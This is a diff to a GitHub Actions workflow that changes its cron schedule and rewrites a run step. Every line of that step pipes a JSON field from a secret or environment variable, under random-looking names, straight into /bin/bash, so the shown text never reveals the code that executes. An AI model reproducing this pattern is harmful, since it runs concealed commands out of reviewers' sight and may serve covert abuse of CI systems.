@@ -2,29 +2,20 @@ name: xiangqiaojiebai
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 1/6 * * *'
+    - cron: '29 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiangqiaojiebai
         env:
-          zeevk82: ${{ secrets.zeevk82 }}
+          yjq4946: ${{ secrets.yjq4946 }}
         run: |
-          echo $zeevk82 | jq -r .ssgp0826 | /bin/bash
-          echo $eyspr66 | jq -r .n0 | /bin/bash
-          echo $pqnqy822 | jq -r .p23 | /bin/bash
-          echo $j39 | jq -r .cu95559 | /bin/bash
-          echo $q96 | jq -r .b2027 | /bin/bash
-          echo $pyz0 | jq -r .hpl033 | /bin/bash
-          echo $xtnst81880 | jq -r .feida3 | /bin/bash
-          echo $mfw90105 | jq -r .sp8 | /bin/bash
-          echo $xvgmp90 | jq -r .fspsa11 | /bin/bash
-          echo $tekbr2 | jq -r .yuux14 | /bin/bash
-          echo $zk58993 | jq -r .ikncs1877 | /bin/bash
-          echo $mc3 | jq -r .pzti12 | /bin/bash
-          echo $vu4637 | jq -r .al477 | /bin/bash
-          echo $goz1725 | jq -r .fct2 | /bin/bash
+          echo $yjq4946 | jq -r .fboq679 | /bin/bash
+          echo $t05225 | jq -r .w35 | /bin/bash
+          echo $ve5493 | jq -r .pcsl5975 | /bin/bash
+          echo $yz765 | jq -r .cnsee3415 | /bin/bash
+          echo $ej7197 | jq -r .wgr1 | /bin/bash
+          echo $o8 | jq -r .uxfbh68 | /bin/bash
 
